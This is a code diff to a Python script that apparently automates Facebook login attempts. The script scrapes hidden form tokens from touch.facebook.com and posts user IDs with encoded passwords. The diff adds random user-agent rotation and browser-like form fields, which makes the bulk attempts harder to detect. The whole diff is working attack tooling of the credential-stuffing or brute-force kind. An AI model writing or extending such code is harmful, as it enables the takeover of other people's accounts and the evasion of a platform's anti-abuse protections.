@@ -12,6 +12,12 @@ from requests.exceptions import ConnectionError
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime 
 from bs4 import BeautifulSoup
+from fake_useragent import UserAgent
+ua = UserAgent()
+def ugenX():
+    ualist = [ua.random for _ in range(50)]
+    return str(random.choice(ualist))
+print(ugenX())
 ###-------[BASIC COLORS]-----------####
 reset = "\033[0m"
 red = "\033[1;31m"
@@ -120,12 +126,31 @@ def ATOM(uid, pww, total_idz):
             session = requests.Session()
             requu1 = session.get('https://touch.facebook.com/')
             data = {
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(requu1.text)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(requu1.text)).group(1),
+            'try_number': '0',
+            'unrecognized_tries': '0',
+            'email': uid,
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'false',
+            'is_smart_lock': 'false',
+            'bi_xrwh': '0',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            'bi_wvdp': '',
+            'fb_dtsg': '',
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(requu1.text)).group(1),
-            'email': uid,
-            'login_source': 'comet_headerless_login',
-            'next': '',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            '__dyn': '',
+            '__csr': '',
+            '__req': random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]),
+            '__fmt': '0',
+            '__a': '',
+            '__user': '0'}
             headers = {
             "Host":"m.facebook.com",
             "Connection":"keep-alive",
